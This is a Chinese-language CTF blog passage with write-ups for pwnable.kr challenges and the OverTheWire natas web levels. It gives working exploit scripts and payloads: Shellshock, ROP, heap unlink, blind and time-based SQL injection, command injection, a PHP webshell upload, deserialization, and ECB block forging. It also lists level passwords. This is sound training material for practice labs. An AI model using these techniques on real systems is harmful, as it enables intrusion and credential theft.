r6，而r6等于pc+1即0x8d05，最低为为1，所以执行bx r6之后会进入thumb模式，这样就会变成2字节对齐，pc存储着当前指令加4的位置，如此一来，下面的mov r3,pc中，r3等于0x8d04+0x4。下一条为adds r3，#4，表示r3 = r3 + 4后更新标志位，因此r3 = 0x8d04 + 0x4 + 0x4。 key2=0x8d04 + 0x4 + 0x4 123456789101112(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump. 最终key3=lr的值 lr寄存器也即R14寄存器，用作子程序链接，称为链接寄存器LK (Link Register)。 作用：使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回 在main函数找到调用key时的代码 120x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;0x00008d80 &lt;+68&gt;: mov r3, r0 BL指令： B或BL指令引起处理器转移到“子程序名”处开始执行。两者的不同之处在于:(1)BL指令在转移到子程序执行之前，将其下一条指令的地址拷贝到R14（LR,链接寄存器）。 由于BL指令保存了下条指令的地址，因此使用指令“MOV PC ,LR”即可实现子程序的返回。(2)B指令则无法实现子程序的返回，只能实现单纯的跳转。用户在编程的时候，可根据具体应用选用合适的子程序调用语句。 key3=0x8d80 三个数相加即可 Exp: 108400 mistake符号优先级相关 1if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)) 比较运算符优先级高于赋值运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对，而另一方面，0作为文件描述符，它指向的是stdin。 两个输入都由我们构造，自由发挥即可。。 Exp: 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;mistake&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;./mistake&#x27;)payload=&#x27;B&#x27;*10sh.sendafter(&quot;do not bruteforce...\\n&quot;,payload)payload=&#x27;C&#x27;*10sh.sendafter(&quot;input password : &quot;,payload)sh.interactive() shellshockCVE-2014-6271（破壳漏洞）面向Google解题 Link Exp: 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;shellshock&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;sh&#x27;)sh.sendline(&quot;env x=&#x27;() &#123; :;&#125;; bash -c \\&quot;cat flag\\&quot; &#x27; ./shellshock&quot;)sh.interactive() coin11234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *import reio=remote(&quot;pwnable.kr&quot;,&quot;9007&quot;)io.recv()def GetWeight(l,r): sendstr = &quot;&quot; if l==r: io.sendline(str(l)) else : for i in range(l,r+1): sendstr = sendstr + str(i)+&quot; &quot; io.sendline(sendstr) ret = io.recvline() return int(ret)def solve(num,chance): l=0 r=num-1 weight=0 for i in range(0,chance): weight=GetWeight(l,int(l+(r-l)/2)) if weight%10!=0: r = int(l+(r-l)/2) else: l = int(l+(r-l)/2)+1 io.sendline(str(r)) print(io.recv())quest=io.recvline().decode()data=re.findall(r&quot;\\d+&quot;,quest)N=int(data[0])C=int(data[1])solve(N,C)print(io.recv(1024)) asm123456789101112131415#coding=utf-8from pwn import *context(arch=&quot;amd64&quot;,os=&quot;Linux&quot;)shell = ssh(host=&quot;pwnable.kr&quot;,user=&quot;asm&quot;,port=2222,password=&quot;guest&quot;)#shell.download_file(&quot;./asm.c&quot;)io = shell.connect_remote(&quot;0.0.0.0&quot;,9026)filename=&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;shellcode=&quot;&quot;shellcode+=shellcraft.open(filename)#打开文件到 rax(返回值)shellcode+=shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,100)#读文件 100个字节 到栈上 (rsp)shellcode+=shellcraft.write(1,&#x27;rsp&#x27;,100)#从rsp 写到stdout=1 (stdin=0) io.sendafter(&quot;give me your x64 shellcode:&quot;,asm(shellcode))io.interactive() unlink1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;unlink&#x27;,password=&#x27;guest&#x27;,port=2222)#shell.download_file(&quot;./unlink.c&quot;)io=process(&quot;./unlink&quot;)shell_addr=0x080484EBre=io.recvline().decode()stack_addr=int(re.split(&quot;:&quot;)[1],16) # &amp;Are=io.recvline().decode()heap_addr=int(re.split(&quot;:&quot;)[1],16) # Aio.recvline()&#x27;&#x27;&#x27;typedef struct tagOBJ&#123; struct tagOBJ* fd;//4 byte struct tagOBJ* bk;//4 byte char buf[8];//8 byte&#125;OBJ;&#x27;&#x27;&#x27;payload = p32(shell_addr)#(A-&gt;buf(0~3))payload +=b&quot;a&quot;*20#(A-&gt;buf(4~7)+padding(0x08))payload += p32(heap_addr+0x8+0x4)#(B-&gt;fd)payload += p32(stack_addr+0x14-0x4)#(B-&gt;bk)#print hex(stack_addr)+&quot; &quot;+hex(heap_addr)io.send(payload)io.interactive() horcruxes1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context(arch=&quot;amd64&quot;,os=&quot;Linux&quot;,log_level=&quot;DEBUG&quot;)shell = ssh(host=&quot;pwnable.kr&quot;,user=&quot;horcruxes&quot;,port=2222,password=&quot;guest&quot;)#shell.download_file(&quot;./horcruxes&quot;)io=shell.connect_remote(&quot;0.0.0.0&quot;,9032)payload=&quot;1&quot;#io.sendlineafter(&quot;guess the password!&quot;,&quot;cat: password: Permission denied&quot;)io.recv()io.sendline(payload)a_addr=0x0809FE4Bb_addr=0x0809FE6Ac_addr=0x0809FE89d_addr=0x0809FEA8e_addr=0x0809FEC7f_addr=0x0809FEE6g_addr=0x0809FF05call_ropme_addr=0x0809FFFCpayload=b&#x27;a&#x27;*(0x74+0x4)+p32(a_addr)+p32(b_addr)+p32(c_addr)+p32(d_addr)+p32(e_addr)+p32(f_addr)+p32(g_addr)+p32(call_ropme_addr)#当函数A()执行结束之后，执行return指令的地址应就是后4个bytes，所以直接将地址罗列在padding数据之后，函数会一个一个的进行跳转io.sendlineafter(&quot;How many EXP did you earned? :&quot;,payload)exp=0io.recvline()for i in range(7): re = io.recvline().decode() u = int(re.strip(&#x27;\\n&#x27;).split(&#x27;+&#x27;)[1][:-1]) print (u) exp += uprint (&quot;Exp: &quot;+str(exp))io.sendlineafter(&quot;Select Menu:&quot;,&quot;1&quot;)io.sendlineafter(&quot;How many EXP did you earned? :&quot;,str(exp))io.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Web题解_natas","slug":"Web_1","date":"2021-06-15T17:24:39.000Z","updated":"2022-03-25T14:03:31.000Z","comments":true,"path":"2021/06/16/Web_1/","link":"","permalink":"http://example.com/2021/06/16/Web_1/","excerpt":"","text":"Web题解_natasEasy_web入门刷题 Level_0Check Souce code Level_0➡Level_1Check Souce code Level_1➡Level_2发现有个png图片，访问上级目录可查看到有flag的txt文档 Level_2➡Level_3Robots协议访问/robots.txt查看到存在目录/s3cr3t/访问即可得到flag Level_3➡Level_4根据提示用Burpsuite抓包改HTTPReferer发送即可 Level_4➡Level_5Learn about cookie更改cookie中Loggedin 值为1即可 Level_5➡Level_612345678910&lt;?include &quot;includes/secret.inc&quot;;if(array_key_exists(&quot;submit&quot;, $_POST))&#123;if($secret == $_POST[&#x27;secret&#x27;])&#123;print&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;&#125;else&#123;print&quot;Wrong secret&quot;;&#125;&#125;?&gt; 发现导入了”includes/secret.inc” ，比较的时候访问该目录可看到密码，提交即可 Level_6➡Level_7include()文件包含漏洞，用户传入的page参数未经过滤直接调用include()函数，传入/etc/natas_webpass/natas8作为参数即可。 Level_7➡Level_81234567891011121314151617&lt;?$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;function encodeSecret($secret) &#123; return bin2hex(strrev(base64_encode($secret)));&#125;if(array_key_exists(&quot;submit&quot;, $_POST)) &#123; if(encodeSecret($_POST[&#x27;secret&#x27;]) == $encodedSecret) &#123; print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;; &#125; else &#123; print &quot;Wrong secret&quot;; &#125;&#125;?&gt; 根据加密过程解密即可 练习一下python 123456789import base64byte=b&#x27;\\x3d\\x3d\\x51\\x63\\x43\\x74\\x6d\\x4d\\x6d\\x6c\\x31\\x56\\x69\\x56\\x33\\x62&#x27;t=byte.decode()print(t)t=t[::-1]#字符切片print(t) t=base64.b64decode(t)print(t) 练习一下linux命令 优雅简洁:) 1echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d -r | -revert reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere. Level_8➡Level_9Learn about passthru()passtru():exec() 函数类似， passthru() 函数也是用来执行外部命令（ command ）的。 用户输入未过滤，直接用 ; 截断grep 命令cat flag 1;cat /etc/natas_webpass/natas10 Level_9➡Level_10注意到对用户输入进行过滤，但只是过滤了; | &amp;特殊字符 Uage of grep and regex1grep &#x27;[A-Za-z]&#x27; 文件名 Demo: 123[a-zA-Z] /etc/natas_webpass/natas11Or. /etc/natas_webpass/natas11 Level_10➡Level_11Learn about the XOR &amp; PHP Code&amp; Json Souce Code Analyse: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//预定义参数，猜测将showpassword设置为yes即可得到密码。$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); //异或加密函数function xor_encrypt($in) &#123; $key = &#x27;&lt;censored&gt;&#x27;; //预定参数key $text = $in; //输入参数 $outText = &#x27;&#x27;; //输出参数 // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) &#123; //for循环，遍历输入参数 $outText .= $text[$i] ^ $key[$i % strlen($key)]; //将输入参数对应位和key对应位异或，key位数不够则从头循环，结果存到输出参数 &#125; return $outText; //返回加密结果&#125; //加载函数：将$_COOKIE[&quot;data&quot;]解密还原，存为 $mydata 数组，返回$mydata。function loadData($def) &#123; global $_COOKIE; $mydata = $def; if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123; $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true); if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123; if (preg_match(&#x27;/^#(?:[a-f\\d]&#123;6&#125;)$/i&#x27;, $tempdata[&#x27;bgcolor&#x27;])) &#123; $mydata[&#x27;showpassword&#x27;] = $tempdata[&#x27;showpassword&#x27;]; $mydata[&#x27;bgcolor&#x27;] = $tempdata[&#x27;bgcolor&#x27;]; &#125; &#125; &#125; return $mydata;&#125; //保存函数：将传入的参数，经过编码处理，存入$_COOKIE[&quot;data&quot;]中。function saveData($d) &#123; setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));&#125; $data = loadData($defaultdata); if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) &#123; if (preg_match(&#x27;/^#(?:[a-f\\d]&#123;6&#125;)$/i&#x27;, $_REQUEST[&#x27;bgcolor&#x27;])) &#123; $data[&#x27;bgcolor&#x27;] = $_REQUEST[&#x27;bgcolor&#x27;]; &#125;&#125; saveData($data); //将showpassword设置为yes即可得到密码if($data[&quot;showpassword&quot;] == &quot;yes&quot;) &#123; print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;;&#125; 先求Key： 12345678910111213&lt;?php$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);$data= &#x27;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#x27;;function xor_encrypt($in,$out) &#123; $key =&#x27;&#x27; ; $text = $in; for($i=0;$i&lt;strlen($text);$i++) &#123; $key .= $text[$i] ^ $out[$i]; &#125; return $key;&#125; echo xor_encrypt(json_encode($defaultdata),base64_decode($data));?&gt; 再构造Exp的Cookie: 1234567891011121314&lt;?php$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);function xor_encrypt($in) &#123; $key = &#x27;qw8J&#x27;; $text = $in; $outText = &#x27;&#x27;; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) &#123; $outText .= $text[$i] ^ $key[$i % strlen($key)]; &#125; return $outText;&#125;echo base64_encode(xor_encrypt(json_encode($defaultdata))); Tips: 简单熟悉一些PHP的语法，比如Json格式，保证基本函数能看懂，理解代码的逻辑。 1234567891011121314151617181920212223import jsonimport base64def myxor(text,key): key=key text=text out=&#x27;&#x27; for i in range(0,len(text)): out+=chr((text[i])^(key[i%len(key)])) return outcookie=&#x27;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#x27;Ori=&#123;&#x27;showpassword&#x27;:&#x27;yes&#x27;,&#x27;bgcolor&#x27;:&#x27;#ffffff&#x27;&#125;Old=&#123;&#x27;showpassword&#x27;:&#x27;no&#x27;,&#x27;bgcolor&#x27;:&#x27;#ffffff&#x27;&#125;json_old=json.dumps(Old).replace(&quot; &quot;,&quot;&quot;)json_ori=json.dumps(Ori).replace(&quot; &quot;,&quot;&quot;)#print(myxor(base64.b64decode(cookie),json_old.encode()))out=base64.b64encode(myxor(json_ori.encode(),&#x27;qw8J&#x27;.encode()).encode())print(out.decode()) EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 Level_11➡Level_12Ez_upload 上传了个图片后发现，文件名会被随机重置，后缀改为jpg，并且上传成功后会有路径信息回显。可以考虑上传个php文件然后根据回显路径解析。 12345&lt;?phpsystem(&#x27;cat /etc/natas_webpass/natas13&#x27;);?&gt; 用户上传数据检测基本没有任何过滤： 1&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt; 只是后缀换成了.jpg Burp抓包改文件名后缀即可 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY Level_12➡Level_13只做了前端文件后缀名校验和文件魔数的校检，php文件前面加上GIF89a即可 Level_13➡Level_14Ez SQL “or”1”=”1 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J Level_14➡Level_151234567891011121314151617import requests url = &quot;http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php&quot;chr = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&quot;payload = r&#x27;natas16&quot; AND password LIKE binary &quot;%s&quot; #&#x27;#使用like模糊查询不会区分大小写，要带上binary。key = &quot;%&quot;while len(key) &lt;= 32: #循环32次 for i in chr: #确定字符 a = key[:-1]+i+key[-1:] print (a) req = requests.post(url=url,data=&#123;&#x27;username&#x27;:payload%a&#125;) print(payload%a) if &quot;This user exists&quot; in req.text: key = a print (key) WaIHEacj63wnNIBROHeqi3p9t0m5nhmh Level_15➡Level_161234567891011121314151617import requestsimport stringurl=&quot;http://natas16.natas.labs.overthewire.org/index.php&quot;def inCheck(payload): r=requests.get(url+payload,auth=(&#x27;natas16&#x27;,&#x27;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#x27;)) return &#x27;Doctor&#x27; not in r.textout=&#x27;&#x27;while(len(out)&lt;32): for i in string.digits+string.ascii_letters: payload=&quot;?needle=$(grep+^&quot;+out+i+&quot;+/etc/natas_webpass/natas17)Doctor&amp;submit=Search&quot; if(inCheck(payload)): out+=i print(out) breakprint(&quot;最终flag=&quot;+out) 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw Level_16➡Level_17时间盲注 注意MYSQL MID()函数用法 MID(ColumnName, Start [, Length]) 1234567891011121314151mysql&gt; SELECT MID(&#39;NowaMagic&#39;, 5, 5);2+------------------------+3| MID(&#39;NowaMagic&#39;, 5, 5) |4+------------------------+5| Magic |6+------------------------+71 row in set 12345678910111213141516171819202122import requestsurl = &#x27;http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php&#x27;key =&#x27;&#x27; for i in range(1,33): a = 32 c = 126 while a&lt;c: b = int((a+c)/2) payload=r&#x27;natas18&quot; and if(%d&lt;ascii(mid(password,%d,1)),sleep(2),1) and &quot;&quot; like &quot;&#x27;%(b,i) try: req = requests.post(url=url,data=&#123;&quot;username&quot;:payload&#125;,timeout=2) except requests.exceptions.Timeout as e: a=b+1 b=int((a+c)/2) continue c=b key +=chr(b) print(key)print(&quot;最终flag=&quot;+key) xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP Level_17➡Level_18Session范围很小爆破即可 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs Level_18➡Level_19SESSION_FORMAT=hex(随机数+”-admin”) eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF Level_19➡Level_20关键逻辑：sessionID存到了文件中，按键值对存在，以空格分隔，如果$_SESSION[“admin”]==1，则成功登陆，得到key。 可以通过重置name,burp抓包，将name参数修改位：name=111 %0Aadmin 1，得到key。 IFekPyrQXftziDEsUr3x21sYuahypdgJ Level_20➡Level_21Session同源，两网站公用同一Session，一网站回显，二网站通过burp抓包添加admin=1，用二网站session填入1网站即可。 chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ Level_21➡Level_22Get添加revelio参数即可得到flag，但是第一个if判断语句中: 1234567891011 &lt;?session_start();if(array_key_exists(&quot;revelio&quot;, $_GET)) &#123; // only admins can reveal the password if(!($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1)) &#123; header(&quot;Location: /&quot;); &#125;&#125;?&gt; 会使得Get添加该参数后服务器返回重定向页面，可以通过burp抓包拦截得到flag D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE Level_22➡Level_23php字符与数值比较时，会从开头截取数字，到字符前为止。 payload=1113zyqiloveyou OsRmXFguozKpTZZ5X14zNO43379LZveg Level_23➡Level_24strcmp漏洞，strcmp函数无法比较数组，会返回0，将passwd输入为数组即可绕过。（要求php版本在5.3之前） GHF6X7YwACaYYssHVY05cFq83hRktl4c Level_24➡Level_25注入点1： natas25.natas.labs.overthewire.org/?lang=…/./…/./…/./…/./…/./var/www/natas/natas25/logs/natas25_p9ifssh0i3ol6u0adbukhvi3j4.log 注入点2:headers oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T Level_25➡Level_26EzPhp反序列化漏洞 序列化可以将对象，类，数组，变量，匿名函数等，转换为字符串，这样用户就方便存储和传输，同时方便恢复使用，对服务器也减轻一定的压力。 析构函数__destruct:当整个请求结束后，对象会调用析构函数 销毁所有有关该对象的东西。 12345678function __destruct()&#123; &#x2F;&#x2F; write exit message $fd&#x3D;fopen($this-&gt;logFile,&quot;a+&quot;); fwrite($fd,$this-&gt;exitMsg); fclose($fd);&#125; 源码中出现从cookie读取对象的过程 123if (array_key_exists(&quot;drawing&quot;, $_COOKIE))&#123; $drawing&#x3D;unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));&#125; 我们构造一个显示password的序列化字符串即可 123456789101112131415161718&lt;?phpclass Logger&#123; private $logFile; private $initMsg; private $exitMsg; function __construct()&#123; #注入信息 $this-&gt;initMsg=&quot;&quot;; $this-&gt;exitMsg=&quot;&lt;?echo include &#x27;/etc/natas_webpass/natas27&#x27;;?&gt;&quot;; $this-&gt;logFile=&quot;img/aaa.php&quot;; &#125;&#125; $test = new Logger();echo serialize($test);echo &quot;\\n&quot;;echo base64_encode(serialize($test)); #显示base64编码后的序列化字符串?&gt; 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ Level_26➡Level_27Mysql溢出截断 1&#96;username&#96; varchar(64) DEFAULT NULL, &#96;password&#96; varchar(64) DEFAULT NULL 当用户输入的用户名”natas28 + 大于64个空格 +任意字符”时， CheckUser()会判定用户不存在，出发创建用户函数，但写入用户名密码时由于Mssql溢出截断，使得用户可以写入natas28密码，进而通过改密码登录natsa28即可得到flag 1234567891011121314151617181920212223242526272829303132333435363738mysql&gt; INSERT INTO users (username,password) values (&#39;u u&#39;,&#39;p4&#39;);Query OK, 1 row affected, 1 warning (0.00 sec)mysql&gt; select * from users where username&#x3D;&#39;u&#39;;+----------+----------+| username | password |+----------+----------+| u | p1 || u | p2 || u | p4 |+----------+----------+3 rows in set (0.00 sec)mysql&gt; select username,LENGTH(username) from users;+----------+------------------+| username | LENGTH(username) |+----------+------------------+| u | 1 || u | 2 || abcd | 4 || u | 4 |+----------+------------------+4 rows in set (0.00 sec)mysql&gt; select * from users where username&#x3D;&#39;u &#39;;+----------+----------+| username | password |+----------+----------+| u | p1 || u | p2 || u | p4 |+----------+----------+3 rows in set (0.01 sec)mysql&gt; select * from users where username&#x3D;&#39;u u&#39;;Empty set (0.00 sec) JWwR438wkgTsNKBbcJoowyysdM82YjeF Level_27➡Level_28三个关键点 确定数据通过EBC加密，确定块大小 12345678910111213141516171819import requestsimport binasciiimport urllibimport base64url = &quot;http://natas28.natas.labs.overthewire.org/index.php&quot;s = requests.Session()s.auth = (&#x27;natas28&#x27;, &#x27;JWwR438wkgTsNKBbcJoowyysdM82YjeF&#x27;)sample = &quot;aaaaaaaa&quot;while len(sample) &lt; 20: data = &#123;&#x27;query&#x27;:sample&#125; r = s.post(url, data=data) cipher = r.url.split(&#x27;=&#x27;)[1] #print(cipher) cipher = urllib.parse.unquote(cipher) print(&quot;[*] %d chars.%d \\t| %s&quot; % (len(sample), len(cipher),base64.b64decode(cipher).hex())) sample += &#x27;a&#x27; 发现存在字符转义情况，具体来说，输入13个a时会新增一个块，但是当输入某个特殊字符时，11个a+特殊字符共12个字符也会新增一个块。这说明特殊字符被转义成了两个字符加密。 123456789101112131415161718import base64from urllib.parse import urlparse, parse_qs, quoteimport requestsauth = (&#x27;natas28&#x27;, &#x27;JWwR438wkgTsNKBbcJoowyysdM82YjeF&#x27;)target = &#x27;http://natas28.natas.labs.overthewire.org/&#x27;specialChars = [&#x27;a&#x27;, &#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;\\\\&#x27;, &#x27;/&#x27;, &#x27;#&#x27;, &#x27;?&#x27;, &#x27;%&#x27;]for c in specialChars: resp = requests.post( target, auth=auth, data=&#123;&#x27;query&#x27;: &#x27;a&#x27; * 11 + c&#125; ) q = base64.b64decode(parse_qs(urlparse(resp.url).query)[&#x27;query&#x27;][0]).hex() for j in range(len(q) // 32): print(q[j * 32: (j + 1) * 32], end=&#x27; &#x27;) print() 遍历发现被转移的字符包括 \\’ ,”,\\ 利用转义和EBC加密以块为单位的特性，在块结尾构造特殊字符 \\’使得被转义的两个字符一个在上一个块，另一个 \\’ 在下一个块，这样下一个块就构造了包含 \\’ 的字符， 利用上述字符逃逸方式构造的payload块放在中间，前面的块和结尾块替换为正常块，即可构造出SQL注入语句 12345678910111213141516171819202122232425262728293031323334353637import requestsimport urllibimport base64url = &quot;http://natas28.natas.labs.overthewire.org&quot;s = requests.Session()s.auth = (&#x27;natas28&#x27;, &#x27;JWwR438wkgTsNKBbcJoowyysdM82YjeF&#x27;)# First we generate a baseline for the header/footerdata = &#123;&#x27;query&#x27;:10 * &#x27; &#x27;&#125;r = s.post(url, data=data)baseline = urllib.parse.unquote(r.url.split(&#x27;=&#x27;)[1])baseline = base64.b64decode(baseline.encode(&#x27;utf-8&#x27;))header = baseline[:48]footer = baseline[48:]# We generate the ciphertext query and parse the resultsqli = 9 * &quot; &quot; + &quot;&#x27; UNION ALL SELECT password FROM users;#&quot;data = &#123;&#x27;query&#x27;:sqli&#125;r = s.post(url, data=data)exploit = urllib.parse.unquote(r.url.split(&#x27;=&#x27;)[1])exploit = base64.b64decode(exploit.encode(&#x27;utf-8&#x27;))# We computer the size of our payloadnblocks = len(sqli) - 10while nblocks % 16 != 0: nblocks += 1 nblocks = int(nblocks / 16)# Then, we forge the queryfinal = header + exploit[48:(48 + 16 * nblocks)] + footerfinal_ciphertext = base64.b64encode(final)search_url = &quot;http://natas28.natas.labs.overthewire.org/search.php&quot;resp = s.get(search_url, params=&#123;&quot;query&quot;:final_ciphertext&#125;)print(resp.text) airooCaiseiyee8he8xongien9euhe8b Level_28➡Level_29发现index.pl处理用户输入 1234567891011121314if(param(&#x27;file&#x27;))&#123; $f=param(&#x27;file&#x27;); if($f=~/natas/)&#123;//P字符串包含检测的语法，检测f中是否含有子串natas print &quot;meeeeeep!&lt;br&gt;&quot;; &#125; else&#123; open(FD, &quot;$f.txt&quot;); print &quot;&lt;pre&gt;&quot;; while (&lt;FD&gt;)&#123; print CGI::escapeHTML($_); &#125; print &quot;&lt;/pre&gt;&quot;; &#125;&#125; Perl脚本基本语法 cat 命令中对 “”的解析 1.在perl中“|”字符会将命令连接到脚本中。2.URL中，空格可以用“+”或者“%20”表示，双引号（”）可以用“%22”表示。3.%00会被url解码成0x00，导致00截断。4.00截断原理：截断漏洞出现的核心就是chr(0)，这个字符不为空 (Null)，也不是空字符 (“”)，更不是空格。当程序在输出含有 chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。5.perl中，open()函数可以执行shell命令。 payload:http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%0 wie9iexae0Daihohv8vuu3cei9wahf0e Level_29➡Level_30123456789101112131415161718if (&#x27;POST&#x27; eq request_method &amp;&amp; param(&#x27;username&#x27;) &amp;&amp; param(&#x27;password&#x27;))&#123; my $dbh = DBI-&gt;connect( &quot;DBI:mysql:natas30&quot;,&quot;natas30&quot;, &quot;&lt;censored&gt;&quot;, &#123;&#x27;RaiseError&#x27; =&gt; 1&#125;); my $query=&quot;Select * FROM users where username =&quot;.$dbh-&gt;quote(param(&#x27;username&#x27;)) . &quot; and password =&quot;.$dbh-&gt;quote(param(&#x27;password&#x27;)); my $sth = $dbh-&gt;prepare($query); $sth-&gt;execute(); my $ver = $sth-&gt;fetch(); if ($ver)&#123; print &quot;win!&lt;br&gt;&quot;; print &quot;here is your result:&lt;br&gt;&quot;; print @$ver; &#125; else&#123; print &quot;fail :(&quot;; &#125; $sth-&gt;finish(); $dbh-&gt;disconnect();&#125; 关键点在$dbh-&gt;quote(param(‘password’)) 在Perl中，可以使用param(‘name’)方法获取post表单中name参数的值，但是这个方法有一个特点，那就是 当我们输入name=foo时，param(‘name’)方法返回的是name的值foo；当我们输入name=foo&amp;name=bar时，param(‘name’)方法返回的是name的值列表[“foo”,”bar”]。 在Perl中，quote()方法的传参类型可以为列表，如果将列表传递给该方法，则quote()会将其解释为单独的参数。 payload:http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00 Level_30➡Level_31关键在$dbh-&gt;quote(param(‘password’)) 当我们输入name=foo时，param(‘name’)方法返回的是name的值foo；当我们输入name=foo&amp;name=bar时，param(‘name’)方法返回的是name的值列表[“foo”,”bar”]。 在Perl中，quote()方法的传参类型可以为列表，如果将列表传递给该方法，则quote()会将其解释为单独的参数。 Perl的quote($string)方法被用来“转义”包含在string中的任何特殊字符并增加所需的外部的引号。这里使用quote方法的本意是将用户的输入放在引号中以防止sql注入。但是当quote()可以接收两个参数时，它的用法变为：第一个参数表示将要被quote的数据，第二个参数表示一个SQL数据类型，决定如何quote。如果第二个参数是非字符串类型（如NUMERIC），则quote将传递其第一个参数，而不带任何引号。可以利用该SQL注入。 hay7aecuungiuKaezuathuk9biin0pu1 Leve_31➡Level_3212345678910111213141516171819202122232425262728my $cgi = CGI-&gt;new;if ($cgi-&gt;upload(&#x27;file&#x27;)) &#123; my $file = $cgi-&gt;param(&#x27;file&#x27;); print &#x27;&lt;table class=&quot;sortable table table-hover table-striped&quot;&gt;&#x27;; $i=0; while (&lt;$file&gt;) &#123; my @elements=split /,/, $_; if($i==0)&#123; # header print &quot;&lt;tr&gt;&quot;; foreach(@elements)&#123; print &quot;&lt;th&gt;&quot;.$cgi-&gt;escapeHTML($_).&quot;&lt;/th&gt;&quot;; &#125; print &quot;&lt;/tr&gt;&quot;; &#125; else&#123; # table content print &quot;&lt;tr&gt;&quot;; foreach(@elements)&#123; print &quot;&lt;td&gt;&quot;.$cgi-&gt;escapeHTML($_).&quot;&lt;/td&gt;&quot;; &#125; print &quot;&lt;/tr&gt;&quot;; &#125; $i+=1; &#125; print &#x27;&lt;/table&gt;&#x27;;&#125;else&#123;print &lt;&lt;END; if ($cgi-&gt;upload(‘file’)) upload检查file参数值代表的文件是否上传，但是用户可以构造多个file参数，而upload只验证其中一个file参数是cvs文件即可，另一个file我们可以赋值构造参数 my file=file=cgi-&gt;param(‘file’); 